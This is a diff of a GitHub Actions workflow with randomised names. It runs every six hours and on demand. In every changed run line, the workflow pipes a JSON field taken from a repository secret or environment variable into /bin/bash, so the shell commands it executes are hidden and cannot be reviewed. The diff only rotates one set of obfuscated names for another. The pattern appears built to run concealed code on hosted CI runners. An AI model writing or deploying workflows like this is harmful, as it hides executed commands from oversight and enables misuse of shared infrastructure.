@@ -3,30 +3,28 @@ name: daitaiyang7465
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
-jobs:  # 16462
+    - cron: '36 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: daitaiyang7465
         env:
-          o05654: ${{ secrets.o05654 }}
+          zwcs2: ${{ secrets.zwcs2 }}
         run: |
-          echo $o05654 | jq -r .e3452 | /bin/bash
-          echo $db53991 | jq -r .khbsk02096 | /bin/bash
-          echo $e3797 | jq -r .njlw539 | /bin/bash
-          echo $l34758 | jq -r .vl28 | /bin/bash
-          echo $ko55313 | jq -r .nb20112 | /bin/bash
-          echo $wzv9 | jq -r .zqfm02835 | /bin/bash
-          echo $gvb6 | jq -r .tlfr301 | /bin/bash
-          echo $a12663 | jq -r .dp10 | /bin/bash
-          echo $cx994 | jq -r .ju34960 | /bin/bash
-          echo $gge39835 | jq -r .guzi007 | /bin/bash
-          echo $fo65330 | jq -r .wq71593 | /bin/bash
-          echo $mp8 | jq -r .uqh98 | /bin/bash
-          echo $nkwux81506 | jq -r .dp84005 | /bin/bash
-          echo $dprj76 | jq -r .qscwb92032 | /bin/bash
-          echo $ryqcg1850 | jq -r .sj4 | /bin/bash
-          echo $swb33 | jq -r .mmiz762 | /bin/bash
+          echo $zwcs2 | jq -r .lva5 | /bin/bash
+          echo $q133 | jq -r .rqtfi6 | /bin/bash
+          echo $qxty3 | jq -r .u0 | /bin/bash
+          echo $bsuv2 | jq -r .at208 | /bin/bash
+          echo $wgkns369 | jq -r .fy8 | /bin/bash
+          echo $chfxg8 | jq -r .s886 | /bin/bash
+          echo $v8795 | jq -r .xip835 | /bin/bash
+          echo $aeevx2952 | jq -r .ijh900 | /bin/bash
+          echo $pp0 | jq -r .dptc03 | /bin/bash
+          echo $xvjj17102 | jq -r .i5269 | /bin/bash
+          echo $mf46 | jq -r .x7 | /bin/bash
+          echo $vi4 | jq -r .pze895 | /bin/bash
+          echo $esk4 | jq -r .jj814 | /bin/bash
+          echo $gdkl311 | jq -r .b4351 | /bin/bash
 
